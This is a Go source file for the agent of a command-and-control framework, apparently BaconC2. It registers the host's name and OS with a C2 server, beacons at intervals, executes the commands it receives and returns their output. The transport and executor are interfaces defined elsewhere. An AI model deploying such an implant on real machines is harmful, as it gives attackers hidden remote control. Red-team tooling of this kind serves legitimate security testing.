package agent

import (
	"log"
	"os"
	"runtime"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/models"
)

type AgentClient struct {
	config          config.AgentConfig
	transport       models.ITransportProtocol
	commandExecutor models.ICommandExecutor
	agent           models.Agent
	isRunning       bool
	stopChan        chan struct{}
}

func NewAgentClient(cfg config.AgentConfig, tr models.ITransportProtocol, exec models.ICommandExecutor) *AgentClient {
	return &AgentClient{
		config:          cfg,
		transport:       tr,
		commandExecutor: exec,
		stopChan:        make(chan struct{}),
	}
}

func (c *AgentClient) Initialize() error {
	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	ip := getOutboundIP()
	c.agent = models.Agent{
		ID:       c.config.AgentID,
		Hostname: hostname,
		IP:       ip,
		OS:       runtime.GOOS,
		Protocol: c.config.Protocol,
	}

	if err := c.transport.Initialize(); err != nil {
		return err
	}

	if err := c.transport.Register(c.agent); err != nil {
		return err
	}

	return nil
}

func (c *AgentClient) Start() error {
	if c.isRunning {
		return nil // Already running
	}

	c.isRunning = true
	log.Printf("Agent %s started, beaconing every %s", c.agent.ID, c.config.BeaconInterval)
	go c.beaconLoop()

	return nil
}

func (c *AgentClient) Stop() {
	if !c.isRunning {
		return
	}

	c.isRunning = false
	close(c.stopChan)

	if err := c.transport.Close(); err != nil {
		log.Printf("Error closing transport: %v", err)
	}
}

func (c *AgentClient) beaconLoop() {
	ticker := time.NewTicker(c.config.BeaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.stopChan:
			return
		case <-ticker.C:
			c.beacon()
		}
	}
}

func (c *AgentClient) beacon() {
	cmd, err := c.transport.Beacon()
	if err != nil {
		log.Printf("Beacon error: %v", err)
		return
	}

	if cmd.ID != "" && cmd.Command != "" {
		log.Printf("Received command %s: %s", cmd.ID, cmd.Command)
		result := c.commandExecutor.Execute(cmd)

		if err := c.transport.SendResult(c.agent.ID, result); err != nil {
			log.Printf("Failed to send command result: %v", err)
		} else {
			log.Printf("Command %s completed with status: %s", cmd.ID, result.Status)
		}
	}
}

func getOutboundIP() string {
	return "127.0.0.1" // Placeholder; real implementation would use net.Dial
}
